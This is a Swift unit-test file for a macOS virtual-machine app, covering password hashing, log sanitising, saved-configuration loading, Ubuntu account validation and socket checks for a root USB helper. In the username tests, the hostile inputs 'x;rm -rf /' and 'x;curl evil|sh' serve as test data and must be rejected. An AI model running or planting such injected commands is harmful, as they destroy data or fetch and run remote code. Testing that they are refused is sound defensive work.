// AVMLogicTests.swift
// AVM — Accessible Virtual Machine
//
// Tests for the logic that can run without a VM, a sysroot or a window.
// Each group names what it protects, because most of these guard a
// promise to users: passwords that work, logs without user names, a root
// helper that can't be aimed at someone else's socket.

import XCTest
import Foundation
@testable import AVMLogic

// MARK: - Ubuntu password hashing

final class SHA512CryptTests: XCTestCase {
    /// The reference vector from the SHA-crypt specification (Drepper).
    /// If this ever fails, Ubuntu would reject every password AVM sets.
    func testSpecificationVector() {
        XCTAssertEqual(
            SHA512Crypt.hash(password: "Hello world!", salt: "saltstring"),
            "$6$saltstring$svn8UoSVapNtMuq1ukKS4tPQd8iKwSMHWjl/O817G3uBnIFNjnQJuesI68u4OTLiBFdcbYEdFCoEOfaS35inz1"
        )
    }

    func testRandomSaltsDiffer() {
        let a = SHA512Crypt.hash(password: "same")
        let b = SHA512Crypt.hash(password: "same")
        XCTAssertTrue(a.hasPrefix("$6$"))
        XCTAssertNotEqual(a, b, "two hashes of one password must use different salts")
    }
}

// MARK: - The diagnostic log never carries the user name

final class SanitizerTests: XCTestCase {
    func testHomePathIsReplaced() {
        XCTAssertEqual(AVMLog.sanitize("/Users/\(NSUserName())/Downloads/x.iso"), "~/Downloads/x.iso")
    }

    func testAnyCapitalisationOfTheShortName() throws {
        let user = NSUserName()
        try XCTSkipIf(user.count < 4, "short names are deliberately not replaced inside words")
        let text = "a \(user.uppercased()) b \(user.lowercased()) c"
        XCTAssertFalse(AVMLog.sanitize(text).localizedCaseInsensitiveContains(user))
    }

    func testOrdinaryWordsSurvive() {
        XCTAssertEqual(AVMLog.sanitize("the virtual machine started"), "the virtual machine started")
    }
}

// MARK: - Saved configurations

final class VMConfigurationTests: XCTestCase {
    /// A configuration saved by AVM 0.1.2, before every setting added
    /// since. It must still load, or every VM in the file disappears.
    func testOldConfigurationStillLoads() throws {
        let json = """
        [{"id":"F48267BA-0CA9-49E4-BD2A-3190FCD06455","name":"Old PC","cpuCount":4,
          "ramSizeGB":8,"diskSizeGB":64,"diskImagePath":"/tmp/disk.qcow2"}]
        """
        let configs = try JSONDecoder().decode([VMConfiguration].self, from: Data(json.utf8))
        let config = try XCTUnwrap(configs.first)
        XCTAssertEqual(config.guestOS, .windows)
        XCTAssertNil(config.windowsEdition)
        XCTAssertFalse(config.isStoredElsewhere)
        XCTAssertFalse(config.usesSecureBoot)
        XCTAssertTrue(config.sharesClipboard)
        XCTAssertEqual(config.effectiveUSBMode, .ask)
    }

    func testUnknownWordsReadAsDefaults() throws {
        let json = """
        [{"id":"F48267BA-0CA9-49E4-BD2A-3190FCD06455","name":"x","cpuCount":2,"ramSizeGB":4,
          "diskSizeGB":40,"diskImagePath":"","usbMode":"someday","guestOSName":"beos",
          "windowsEditionName":"enterprise"}]
        """
        let config = try XCTUnwrap(try JSONDecoder().decode([VMConfiguration].self, from: Data(json.utf8)).first)
        XCTAssertEqual(config.effectiveUSBMode, .ask)
        XCTAssertEqual(config.guestOS, .windows)
        XCTAssertNil(config.windowsEdition)
    }

    func testEditionsSelectTheRightImageAndKey() {
        XCTAssertEqual(WindowsEdition.pro.imageName, "Windows 11 Pro")
        XCTAssertEqual(WindowsEdition.pro.genericProductKey, "VK7JG-NPHTM-C97JM-9MPGT-3V66T")
        XCTAssertEqual(Set(WindowsEdition.allCases.map(\.genericProductKey)).count, WindowsEdition.allCases.count)
    }

    func testExternalDriveNameAndMissingDrive() {
        var config = VMConfiguration(name: "Travel PC")
        config.storageFolderPath = "/Volumes/Backup Drive/AVM Virtual Machines/\(config.id.uuidString)"
        XCTAssertEqual(config.storageDriveName, "Backup Drive")
        XCTAssertTrue(config.storageIsMissing)
        XCTAssertTrue(config.storageMissingMessage.contains("Backup Drive"))
    }

    func testStoredHereByDefault() throws {
        let config = VMConfiguration()
        XCTAssertNil(config.storageDriveName)
        XCTAssertFalse(config.storageIsMissing)
        XCTAssertEqual(try config.directoryURL().lastPathComponent, config.id.uuidString)
    }

    /// QEMU reads a comma as the next option: "/Volumes/Backup, 2TB" used
    /// to stop that VM ever starting.
    func testCommasAreEscapedForQEMU() {
        XCTAssertEqual(QEMUOption.value("/Volumes/Backup, 2TB/disk.qcow2"), "/Volumes/Backup,, 2TB/disk.qcow2")
        XCTAssertEqual(QEMUOption.value("/plain/path"), "/plain/path")
    }
}

// MARK: - Ubuntu's unattended install

final class UbuntuAccountTests: XCTestCase {
    func testSystemNamesAreRefused() {
        for name in ["root", "audio", "video", "plugdev", "systemd-resolve", "ubuntu"] {
            XCTAssertNotNil(UbuntuAccount.problem(withUserName: name), "\(name) should be refused")
        }
    }

    func testOrdinaryNamesAreAccepted() {
        XCTAssertNil(UbuntuAccount.problem(withUserName: "amena"))
        XCTAssertNil(UbuntuAccount.problem(withUserName: "a_b-1"))
    }

    func testMalformedNamesAreRefused() {
        for name in ["", "Amena", "1abc", "a b", "x;rm -rf /", String(repeating: "a", count: 33)] {
            XCTAssertNotNil(UbuntuAccount.problem(withUserName: name), "\(name) should be refused")
        }
        XCTAssertNotNil(UbuntuAccount.problem(withRealName: "Name: With Colon"))
    }

    /// A hand-edited account file must not be able to put shell text into
    /// the root install script.
    func testLoadRejectsAnUnsafeSavedName() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let bad = #"{"realName":"X","userName":"x;curl evil|sh","passwordHash":"$6$a$b","signInAutomatically":true}"#
        try bad.write(to: dir.appendingPathComponent(UbuntuAccount.fileName), atomically: true, encoding: .utf8)
        XCTAssertNil(UbuntuAccount.load(fromVMDirectory: dir))
    }

    func testSavedAccountIsOwnerOnly() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let account = UbuntuAccount(realName: "A", userName: "amena", passwordHash: "$6$a$b", signInAutomatically: false)
        try account.save(inVMDirectory: dir)
        let mode = try FileManager.default.attributesOfItem(atPath: dir.appendingPathComponent(UbuntuAccount.fileName).path)[.posixPermissions] as? Int
        XCTAssertEqual(mode, 0o600)
        XCTAssertEqual(UbuntuAccount.load(fromVMDirectory: dir), account)
    }

    /// Every layout in the table must also pass load()'s own check, or a
    /// VM made with that layout could never install.
    func testKeyboardTableMatchesTheLoadCheck() {
        for (id, layout) in UbuntuKeyboard.table {
            XCTAssertNotNil(layout.layout.range(of: "^[a-z]{2,8}$", options: .regularExpression), "\(id) layout")
            if let variant = layout.variant {
                XCTAssertNotNil(variant.range(of: "^[a-z_]{1,16}$", options: .regularExpression), "\(id) variant")
            }
        }
    }

    func testYAMLQuotingEscapes() {
        XCTAssertEqual(UbuntuInstallPipeline.yamlQuoted(#"Kelly "K" Ford"#), #""Kelly \"K\" Ford""#)
    }
}

// MARK: - The root USB helper's socket check

final class StreamSocketCheckTests: XCTestCase {
    private var root = ""
    private var dir = ""
    private var socketPath = ""
    private var fd: Int32 = -1

    override func setUpWithError() throws {
        let uid = getuid()
        root = "/tmp/avm-\(uid)"
        dir = "\(root)/\(UUID().uuidString)"
        socketPath = "\(dir)/usbredir-5.sock"
        mkdir(root, 0o700)
        chmod(root, 0o700)
        XCTAssertEqual(mkdir(dir, 0o700), 0)
        fd = socket(AF_UNIX, SOCK_STREAM, 0)
        var address = sockaddr_un()
        address.sun_family = sa_family_t(AF_UNIX)
        _ = withUnsafeMutableBytes(of: &address.sun_path) { buffer in
            socketPath.utf8CString.withUnsafeBytes { buffer.copyMemory(from: $0) }
        }
        let bound = withUnsafePointer(to: &address) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                Darwin.bind(fd, $0, socklen_t(MemoryLayout<sockaddr_un>.size))
            }
        }
        XCTAssertEqual(bound, 0)
    }

    override func tearDown() {
        Darwin.close(fd)
        unlink(socketPath)
        rmdir(dir)
    }

    func testTheUsersOwnSocketIsAccepted() {
        XCTAssertNil(streamSocketProblem(socketPath, uid: getuid()))
    }

    func testAnotherUserIsRefused() {
        XCTAssertNotNil(streamSocketProblem(socketPath, uid: getuid() + 1))
    }

    func testPathsOutsideThePrivateFolderAreRefused() {
        let uid = getuid()
        for path in ["/tmp/elsewhere/\(UUID().uuidString)/usbredir-5.sock",
                     "\(dir)/qmp.sock",
                     "\(root)/../avm-\(uid)/\(URL(fileURLWithPath: dir).lastPathComponent)/usbredir-5.sock",
                     "/var/run/usbmuxd"] {
            XCTAssertNotNil(streamSocketProblem(path, uid: uid), path)
        }
    }

    func testAFolderOthersCanOpenIsRefused() {
        chmod(dir, 0o755)
        defer { chmod(dir, 0o700) }
        XCTAssertNotNil(streamSocketProblem(socketPath, uid: getuid()))
    }

    func testASymlinkInPlaceOfTheFolderIsRefused() throws {
        let real = "\(root)/real-\(UUID().uuidString)"
        XCTAssertEqual(rename(dir, real), 0)
        XCTAssertEqual(symlink(real, dir), 0)
        defer {
            unlink(dir)
            rename(real, dir)
        }
        XCTAssertNotNil(streamSocketProblem(socketPath, uid: getuid()))
    }
}

